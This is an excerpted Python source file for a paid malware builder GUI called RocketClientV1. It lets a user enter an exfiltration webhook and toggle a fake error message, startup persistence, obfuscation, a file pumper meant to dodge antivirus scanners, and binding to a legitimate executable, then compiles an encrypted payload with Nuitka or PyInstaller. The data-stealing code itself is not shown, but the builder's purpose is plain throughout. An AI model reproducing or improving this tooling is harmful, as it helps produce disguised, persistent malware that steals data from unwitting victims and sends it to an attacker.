...
class App(ctk.CTk):
    def __init__(self):
        ...
        self.title(f"RocketClientV1 Paid Version")
        ...
        self.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "rocket.png")), size=(60, 60))
        self.large_test_image = ctk.CTkImage(Image.open(os.path.join(image_path, "rocket.png")), size=(500, 150))
        self.image_icon_image = ctk.CTkImage(Image.open(os.path.join(image_path, "rocket.png")), size=(20, 20))
        ...
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}rocket.ico")
        self.boundExePath = ""
        ...
        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text="  RocketClientV1", image=self.logo_image,
        ...
        self.dashboard_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
                                                        ...
                                                        text_color=("gray10", "gray100"), hover_color=("gray0", "grey10"),
        ...
        self.frame_2_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=ctk.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray100"), hover_color=("gray0", "gray10"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        ...
        self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
            size=15, family=self.font), placeholder_text="Add Server Webhook here")
        ...
        self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#bcbcbc", hover_color="#bcbcbc", font=ctk.CTkFont(size=15, family=self.font))
        ...
        self.option_help = ctk.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#bcbcbc", hover_color="#bcbcbc")
        ...
        self.ping = ctk.CTkCheckBox(self.builder_frame, text="Ping", font=ctk.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#bcbcbc", hover_color="#bcbcbc")
        ...
        self.pingtype = ctk.CTkOptionMenu(
            ...
            fg_color="#bcbcbc", button_hover_color="#bcbcbc", button_color="#999999")
        ...
        self.error = ctk.CTkCheckBox(self.builder_frame, text="Fake Error", font=ctk.CTkFont(
            size=17, family=self.font), fg_color="#bcbcbc", hover_color="#bcbcbc")
        ...
        self.startup = ctk.CTkCheckBox(
            ...
            fg_color="#bcbcbc", hover_color="#bcbcbc")
        ...
        self.obfuscation = ctk.CTkCheckBox(
            ...
            fg_color="#bcbcbc", hover_color="#bcbcbc", command=self.check_obfuscation)
        ...
        self.pump = ctk.CTkCheckBox(self.builder_frame, text="File Pumper", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#bcbcbc", hover_color="#bcbcbc", command=lambda: (self.check_pumper(), self.check_pump()))
        ...
        self.pump_size = ctk.CTkOptionMenu(self.builder_frame, width=30, font=ctk.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#bcbcbc", button_hover_color="#bcbcbc", button_color="#999999")
        ...
        self.fileopts = ctk.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
                                                    ...
                                                    fg_color="#bcbcbc", button_hover_color="#bcbcbc", button_color="#999999", command=self.file_type_check)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("nuitka (.exe)")

        self.icon = ctk.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#bcbcbc", hover_color="#bcbcbc",
        ...
        self.bindExeButtonControl = ctk.CTkButton(self.builder_frame, width=575, text="Bind Executable", fg_color="#bcbcbc", hover_color="#bcbcbc",
        ...
        self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                             fg_color="#bcbcbc", hover_color="#bcbcbc", command=self.buildfile)
...
Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
    ...
    def check_webhook_button(self):
        if self.verify_webhook():
            ...
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#bcbcbc",
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#bcbcbc", hover_color="#bcbcbc", text="Check Webhook")
    ...
    def get_config(self):
            ...
            try:
                with open(self.basefilepath + "\\rocket.py", 'r', encoding="utf-8") as f:
                    code = f.read()
                ...
                code += """Rocket(__CONFIG__["webhook"])"""
        ...
        try:
            ...
            if filetype == "pyinstaller":
                ...
                command = [
                    ...
                    "--add-data", "rocket.aes;.", "--name", f'{filename}.exe',
                ...
                if os.path.isfile("bound.rocket"):
                    command.insert(-1, "--add-data")
                    command.insert(-1, "bound.rocket;.")     
                ...
                if sys.version_info[:2] > (3, 11):
                    ...
                    command = [
                        ...
                        "--prefer-source-code", "--include-data-file=rocket.aes=.",
                    ...
                    try:
                        ...
                        if os.path.isfile("bound.rocket"):
                            command.insert(-1, "--include-data-file=bound.rocket=.")
    ...
    def cleanup_files(self, filename):
        ...
        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.rocket", "rocket.aes", "loader-o.py", "loader-o.spec"}
...
class %s:
    ...
    def PrepareBound(self):
        if os.path.isfile(self.boundExePath):
            ...
            with open("bound.rocket", "wb") as f:
                f.write(encrypted)
                
        elif os.path.isfile("bound.rocket"):
            os.remove("bound.rocket")
